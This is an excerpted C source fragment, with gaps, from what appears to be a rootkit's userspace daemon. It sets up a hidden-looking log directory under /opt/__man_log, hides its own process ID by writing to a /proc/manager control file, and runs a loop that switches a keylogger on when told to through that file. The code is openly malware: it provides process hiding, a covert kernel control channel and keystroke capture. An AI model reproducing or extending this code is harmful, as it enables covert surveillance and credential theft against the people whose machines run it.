...
FILE *evlog;	
char *evlog_path = "/opt/__man_log/evlog.txt"; 
char *control_path = "/proc/manager";
...
int setup_dirs(void) {
    return mkdir("/opt/__man_log/", S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);		/* log directory */
}
...
int setup_logs(void) {
	...
	error_log = fopen("/opt/__man_log/log.txt", "a+"); 					/* daemon log */
	if (NULL == error_log) {
...
int hide_pid(void) {
	...
	write(control_file, dpid, sizeof(dpid));			                	/* passes command to the manager */
...
void key_listen(void) {
	...
	char *kl = "keylogger: 1";								/* defines what keylogger is listening for on /proc/manager */
	...
	while(1) {				
		...
		if ((!listening) && (toggle != NULL)) {
			...
			ssize_t readreturn2 = read(control_file2, cmd, sizeof(cmd) - 1);	/* read from /proc/manager */
			if (-1 == readreturn2) {
